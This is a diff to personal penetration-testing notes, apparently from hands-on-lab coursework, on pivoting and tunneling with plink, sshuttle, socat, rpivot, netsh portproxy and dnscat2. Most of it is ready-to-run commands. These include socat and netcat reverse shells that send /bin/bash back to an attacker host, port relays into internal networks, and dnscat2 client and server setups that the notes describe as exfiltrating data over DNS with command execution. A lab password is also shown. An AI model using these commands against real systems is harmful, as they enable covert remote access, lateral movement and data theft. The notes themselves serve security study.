@@ -9,6 +9,9 @@
   - [CHISEL](#chisel)
   - [SSHUTTLE](#sshuttle)
   - [SOCAT](#socat)
+  - [Rpivot](#rpivot)
+  - [Netsh](#netsh)
+  - [DNS Tunneling](#dns-tunneling)
 - [External Tools](#external-tools)
 - [Phishing](#phishing)
 - [Passive](#passive)
@@ -256,7 +259,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o bac
 socks4 	127.0.0.1 9050
 ```
 
-
 - FoxyProxy
   - better for web
 
@@ -290,6 +292,13 @@ socks4 	127.0.0.1 9050
 
 ### PLINK.EXE
 - command line for putty
+- **Dynamic Port Forward**
+  - plink -ssh -D 9050 user@$TARGET
+    - ssh session betweent Attacker_windows <=> Pivot_linux
+    - Listens on port 9050
+- **Proxifier**
+  - starts socket tunnel via ssh
+
 - cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
 - convert key with puttygen: puttygen key -o xxx.ppk
 
@@ -323,10 +332,22 @@ socks4 	127.0.0.1 9050
   - chisel server => victim
 
 ### SSHUTTLE
-- easier to handle
-- only linzx
-- need ssh access to public interface
-- sshuttle -r username@address subnet  
+- Easier to handle + Only SSH + No need of proxychains
+- only with ssh
+
+```
+# install
+apt-get install sshuttle
+
+# Virtualenv
+virtualenv -p python3 /tmp/sshuttle
+. /tmp/sshuttle/bin/activate
+pip install sshuttle
+```
+
+- sshuttle -r username@address Target_IP/Network 
+- sshuttle -r ubuntu:'HTB_@cademy_stdnt!'@10.129.204.118 172.16.5.0/23 -v
+  - -r pivot 
   - -N to guess the subnet
 - No password:
   - sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
@@ -339,7 +360,9 @@ socks4 	127.0.0.1 9050
 - Bidirectional ==> pipe socket ==> 2 independent network without SSH
   - mestasploit listener <==> socat on target
     - socat will listen on port 8080 and forward everything to attacker 80
+
 ```
+# Reverse shell
 socat TCP4-LISTEN:8080,fork TCP4:ATTACKER:80
 ```
   - Steps Reverse shell
@@ -347,8 +370,6 @@ socat TCP4-LISTEN:8080,fork TCP4:ATTACKER:80
     2.  Create payload for target
     3.  upload payload to the target
     4.  start multi handler on the attacker
-
-
 
 ```mermaid
 ---
@@ -380,21 +401,20 @@ direction LR
 end
 ```
 
-- Steps
-  1. Start bind shell listener
 ```
+# Bind shell
 socat TCP4-LISTEN:8080,fork TCP4:TARGET:8443
 ```
 
 - Port Forwarding - Method 1
   - open port on target + redirect to target server = ./socat tcp-l:[port_on_target],fork,reuseaddr tcp:[target_ip]:3306 &
 
-- Method 2 -Quieter - read more about that https://tryhackme.com/room/wreath: 
+- Method 2 -Quieter  
   - Attacker, opens to ports: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
   - target: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
 - on target: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect target back to us on port 443
 - on target: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
-- Port Forwarding [From_Compromised_to_TARGET]: ./socat tcp-l:[port_on_compromised],fork,reuseaddr tcp:[IP_Target]:3306 &
+- Port Forwarding [From_Pivot_to_TARGET]: ./socat tcp-l:[port_on_Pivot],fork,reuseaddr tcp:[IP_Target]:3306 &
 
 - Encrypted:
   - Create key + Litener + Connect
@@ -432,6 +452,103 @@ socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
   # Listener # socat -d -d TCP-LISTEN:4443,fork STDOUT
   # Victim   # socat TCP:10.20.30.129:4443 EXEC:/bin/bash
 ```
+
+### Rpivot
+- Reverse SOCKS proxy
+- Similar to dynamic port forwarding, but this time we start it on the pivot
+- [Tool](https://github.com/klsecservices/rpivot.git)
+
+- Steps
+  1. Start server.y on the target
+    - server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+  2. Upload rpivot on the pivot
+  3. Run client.py
+    - client.py --server-ip $ATTACKER --server-port 9999
+  4. Set up proxychains to pivot over local server on attacking machine
+    - proxychains cmd Target:port
+```
+# Server
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+
+# Client
+python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+
+# Client with authentication
+python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
+
+# Proxychains
+proxychains firefox-esr 172.16.5.135:80
+```
+
+### Netsh
+- [Windows command line tool](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts)
+  - Find routes + view firewall settings + add proxies + create port forwarding rules
+- windows pivot
+- Steps
+  - On windows pivot start netsh and add proxy listen_port
+  - on the attacker connect to pivot and forward listen_port
+
+```
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25 
+- v4tov4: IPv4 to IPv4 (also 6-6, 4-6, 6-4)
+
+# Verify
+netsh.exe interface portproxy show v4tov4 all
+
+# On attacker
+xfreerdp /v:Pivot:listen_port
+```
+
+```mermaid
+---
+title: Netsh
+---
+flowchart TD
+subgraph Z[" "]
+direction LR
+    A[Attacker]:::foo -->|8080| B(netsh listens 8080:PIVOT WINDOWS:Connect target):::bar -->|3389| C(Target 1)
+
+
+    classDef foo stroke:#f00
+    classDef bar stroke:#0f0
+end
+```
+
+### DNS Tunneling
+- [dnscat2](https://github.com/iagox86/dnscat2)
+  - send data using DNS protocol
+  - Inside TXT record
+  - When local DNS server tries to resolver an address, data is exfiltrated and sent to network
+  - Exfiltration
+
+```
+git clone https://github.com/iagox86/dnscat2.git
+
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+
+# server (attacker)
+sudo ruby dnscat2.rb --dns host=$ATTACKER,port=53,domain=inlanefreight.local --no-cache
+
+
+
+# Client for windows
+```
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+- [dnscat2-powershell: Client for windows](https://github.com/lukebaggett/dnscat2-powershell)
+
+```
+# Import module
+Import-Module .\dnscat2.ps1
+
+# Client (pivot): Create tunnel  use secret created by server
+Start-Dnscat2 -DNSserver $ATTACKER -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+ruby dnscat.rb --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
+```
+
+
 
 ## External Tools
 - enum4linux IP_
